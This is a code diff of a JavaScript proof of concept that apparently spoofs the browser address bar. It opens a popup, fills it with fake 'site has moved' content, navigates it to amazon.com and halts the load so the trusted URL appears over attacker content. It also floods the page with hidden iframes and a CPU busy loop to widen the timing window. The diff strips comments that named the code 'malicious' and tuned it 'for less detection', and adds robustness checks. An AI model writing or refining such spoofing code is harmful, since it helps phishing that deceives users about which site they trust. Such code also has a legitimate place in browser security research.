@@ -11,36 +11,35 @@
 var w;
 var t;
 var z;
-var slowdownFactor = new URLSearchParams(window.location.search).get('slow') || 50; // Adjustable via ?slow=100
+var slowdownFactor = new URLSearchParams(window.location.search).get('slow') || 50;
 
-// Inject malicious content if 'fake' in URL
 if (location.href.indexOf("fake") !== -1) {
     document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1><div id='spinner'>Loading...</div>";
-    // Add fake spinner for realism
     var style = document.createElement('style');
     style.innerHTML = "#spinner { animation: spin 1s linear infinite; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }";
     document.head.appendChild(style);
 }
 
 function foo(event) {
-    event.preventDefault(); // Prevent default navigation
+    event.preventDefault();
     document.getElementById("test").href = "#";
     
-    // Try popup; fallback to new tab if blocked
-    w = window.open("?fake", "_blank"); // Use _blank for potential tab
+    w = window.open("?fake", "_blank");
     if (!w) {
         alert("Popup blocked; trying new tab...");
-        w = window.open("?fake", "_blank"); // Force new tab
+        w = window.open("?fake", "_blank");
     }
     
-    t = setInterval(bar, Math.random() * 10 + 1); // Randomized interval for fuzzing (1-11ms)
+    if (w) {
+        t = setInterval(bar, Math.random() * 10 + 1);
+    }
 }
 
 function bar() {
-    if (w && w.location.href !== 'about:blank') {
+    if (w && w.location && w.location.href !== 'about:blank') {
         alert("Redirecting");
         document.body.innerHTML = "<h1>Redirecting</h1>";
-        slow(); // Enhanced slowdown
+        slow();
         w.location.href = 'https://www.amazon.com/';
         clearInterval(t);
         z = setInterval(baz, 1);
@@ -49,38 +48,41 @@ function bar() {
 
 function baz() {
     try {
-        if (w.location.href !== 'about:blank') {
-            // Interrupt with stop() instead of 204 for better content persistence
-            w.stop();
+        if (w && w.location && w.location.href !== 'about:blank') {
+            if (typeof w.stop === 'function') {
+                w.stop();
+            } else if (w.document && w.document.execCommand) {
+                w.document.execCommand('Stop');
+            }
             clearInterval(z);
-            // Immediate close without long timeout; add alert for confirmation
             setTimeout(() => {
                 alert('ok');
-                w.location.href = 'about:blank';
-                w.close();
-            }, 500); // Shorter for less detection
+                if (w && !w.closed) {
+                    w.location.href = 'about:blank';
+                    w.close();
+                }
+            }, 500);
         }
     } catch (e) {
         console.error("Cross-origin error:", e);
-        // Fallback if stop() fails
-        w.location.href = 'https://www.google.com/csi';
+        if (w && !w.closed) {
+            w.location.href = 'https://www.google.com/csi';
+        }
         clearInterval(z);
     }
 }
 
-// Enhanced slowdown: More iframes + CPU loop
 function slow() {
-    // Network load
     for (let i = 0; i < slowdownFactor; i++) {
         let iframe = document.createElement("iframe");
         iframe.src = 'https://www.amazon.com/';
-        iframe.style = 'display:none';
+        iframe.style.display = 'none';
         document.body.appendChild(iframe);
     }
-    // CPU-intensive loop (sim hash for delay)
+    
     let start = Date.now();
-    while (Date.now() - start < 500) { // 500ms busy wait
-        Math.sqrt(Math.random() * 1000000); // Simulate computation
+    while (Date.now() - start < 500) {
+        Math.sqrt(Math.random() * 1000000);
     }
 }
 </script>
